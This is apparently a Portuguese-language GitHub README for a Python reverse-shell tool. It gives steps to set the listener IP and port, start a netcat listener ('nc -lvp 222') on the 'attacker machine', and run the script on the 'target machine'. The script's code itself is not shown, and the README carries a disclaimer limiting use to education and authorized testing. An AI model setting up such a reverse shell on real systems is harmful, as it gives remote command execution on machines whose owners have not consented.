<p align="center">
  <img src="https://i.imgur.com/AVD4rUO.png" alt="Reverse Shell Hacker Art" width="600"/>
</p>

<h1 align="center">🐍 Reverse Shell em Python</h1>
<p align="center">
  Ferramenta simples e eficaz para execução remota de comandos via conexão reversa.
</p>

---

## 👤 Autor

**Miguel Vasco**

Desenvolvedor entusiasta de segurança ofensiva, automações e exploração de sistemas.

---

## ⚙️ Funcionalidades

- Estabelece uma **conexão reversa** com o host atacante.
- Permite a **execução remota de comandos**.
- Código limpo, direto e de fácil customização.

---

## 🚀 Como Usar

1. **Clone o repositório:**
    ```bash
    git clone https://github.com/Miguel-Vasco7/reverse_shell.py.git
    cd reverse_shell.py
    ```

2. **Configure o IP alvo:**
   - Edite o arquivo `reverse_shell.py` e substitua:
     ```python
     HOST = "<ip_do_listener>"
     PORT = 222
     ```

3. **Inicie o listener (máquina atacante):**
    ```bash
    nc -lvp 222
    ```

4. **Execute o script na máquina alvo:**
    ```bash
    python3 reverse_shell.py
    ```

---

## ⚠️ Aviso Legal

> Esta ferramenta foi desenvolvida **exclusivamente para fins educacionais e testes autorizados**. O uso não autorizado em sistemas alheios é **ilegal** e **antiético**. O autor **não se responsabiliza** por qualquer uso indevido.

---

## 🤝 Contribuições

Contribuições são sempre bem-vindas!  
Sinta-se à vontade para abrir uma **issue** ou enviar um **pull request**.


